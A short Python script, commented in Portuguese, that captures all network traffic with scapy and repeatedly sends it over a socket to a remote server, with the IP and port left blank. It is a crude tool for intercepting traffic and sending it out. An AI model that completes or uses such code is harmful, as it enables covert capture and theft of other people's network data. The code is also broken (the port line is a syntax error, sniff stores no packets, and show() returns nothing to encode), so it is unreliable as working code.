from scapy.all import *
import socket
pacote =sniff(filter='',store=0)
l=pacote.show()
v=l.encode ()
while True:
    s=socket.socket ()
    IP=""
    PORTA=# aqui vc coloca a porta para conexão no servidor
    s.connect ((IP,PORTA))
    s.send (v)
